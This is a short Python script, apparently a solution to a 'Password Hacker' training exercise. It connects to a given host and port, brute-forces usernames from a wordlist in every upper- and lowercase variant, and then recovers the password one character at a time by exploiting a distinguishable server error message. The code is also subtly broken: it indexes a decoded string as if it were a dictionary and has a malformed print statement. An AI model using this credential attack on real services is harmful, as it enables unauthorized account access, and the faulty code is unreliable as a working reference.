import itertools
import socket
import sys
import json
import string


def receive_cmd():
    HOST = sys.argv[1]
    PORT = sys.argv[2]
    return HOST, PORT


def create_socket(HOST, PORT):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        login = check_log(s)
        check_pwd(s, login)


def check_pwd(s, login):
    all_chars = set(string.ascii_lowercase+string.ascii_uppercase+string.digits)
    pwd = ""
    un_success = True
    while un_success:
        for ch in all_chars:
            req = {"login": login, "password": pwd + ch}
            request = json.dumps(req)
            enc_req = request.encode()
            s.send(enc_req)
            response = s.recv(1024)
            response = response.decode("UTF-8")
            if response["result"] == "Exception happened during login":
                pwd += ch
                break
            if response["result"] == "Connection success!":
                print(f'{"login": {login}, "password": {pwd + ch}}')
                un_success = False
                break


def check_log(s):
    path = "C:\\Users\\gaeta\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\hacking\\"
    with open(path + "logins.txt", "r", encoding="UTF-8") as f:
        logins = f.readlines()
        pwd = " "
        for login in logins:
            login = login.strip()
            for var_log in map(lambda x: ''.join(x),
                                 itertools.product(*([letter.lower(), letter.upper()] for letter in login))):
                req = {"login": var_log, "password": pwd}
                request = json.dumps(req)
                enc_request = request.encode()
                s.send(enc_request)
                response = s.recv(1024)
                response = response.decode("UTF-8")
                if response["result"] == "Wrong password!":
                    return login
                else:
                    break


HOST, PORT = receive_cmd()
create_socket(HOST, int(PORT))

